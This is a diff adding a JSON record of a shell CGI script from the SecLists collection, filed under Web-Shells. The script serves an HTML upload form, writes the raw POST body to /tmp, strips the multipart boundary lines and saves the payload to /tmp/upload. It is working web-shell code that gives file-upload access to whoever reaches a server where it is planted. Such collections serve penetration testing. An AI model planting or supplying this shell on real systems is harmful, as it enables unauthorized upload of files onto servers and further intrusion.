@@ -1,0 +1,9 @@
+{
+  "source": "github",
+  "source_id": "github:danielmiessler/SecLists:Web-Shells/FuzzDB/up.sh",
+  "title": "danielmiessler/SecLists/Web-Shells/FuzzDB/up.sh",
+  "text": "#!/bin/sh\n#\n# BETA1 - upload to /tmp/upload\n#\n# SH_KIT\n#\n# up.sh = File Upload\n#\n# by: The Dark Raver\n# modified: 16/12/2005\n#\n\necho Content-Type: text/html\necho\n\necho \"<html><body>\"\necho \"<form enctype=\\\"multipart/form-data\\\" action=\\\"\\\" method=\\\"post\\\">\"\necho \"<p>Local File: <input name=\\\"userfile\\\" type=\\\"file\\\">\"\necho \"<input type=\\\"submit\\\" value=\\\"Send\\\">\"\necho \"</form><br><br><br>\"\n\necho \"<hr>\"\n\ndd count=$CONTENT_LENGTH bs=1 of=/tmp/test\n\nlineas=`cat /tmp/test | wc -l`\n#echo LIN: $lineas\nlineas2=`expr $lineas - 4`\n#echo LIN2: $lineas2\nlineas3=`expr $lineas2 - 1`\n#echo LIN3: $lineas3\n\n#echo \"<hr>\"\n\ntail -$lineas2 /tmp/test > /tmp/test2\nhead -$lineas3 /tmp/test2 > /tmp/upload\n#rm /tmp/test\n#rm /tmp/test2\n\necho \"<pre>\"\ncat /tmp/upload\necho \"</pre>\"\n\n",
+  "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Web-Shells/FuzzDB/up.sh",
+  "language": "shell",
+  "kind": "code"
+}
